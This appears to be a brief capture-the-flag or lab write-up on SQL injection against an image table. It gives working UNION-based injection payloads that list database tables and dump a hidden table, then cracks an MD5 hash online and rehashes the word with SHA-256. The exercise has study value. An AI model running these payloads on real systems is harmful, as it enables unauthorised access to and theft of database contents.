sql-injection

select * from images where id='user input'

if you will input '1 or 1=1', then it will show you everything located in -images- table.
after that you will be able to add union-query to know all allowed tables in db:

```
1 or 1=1 union select table_name, column_name FROM information_schema.columns
```

after that you will see the all tables of db.
i found list_images and it's columns: url, comment.
now i just need to use correct query:

```
1 or 1=1 union select url, comment from list_images
```

the last output shows me hash '1928e8083cf461a51303633093573c46' hashed by MD5, i used https://crackstation.net/ to decrypt it and got 'albatroz' word, that i encrypted to sha256 by this command:

python code
```
import hashlib
print(hashlib.sha256(b'albatroz').hexdigest())
```
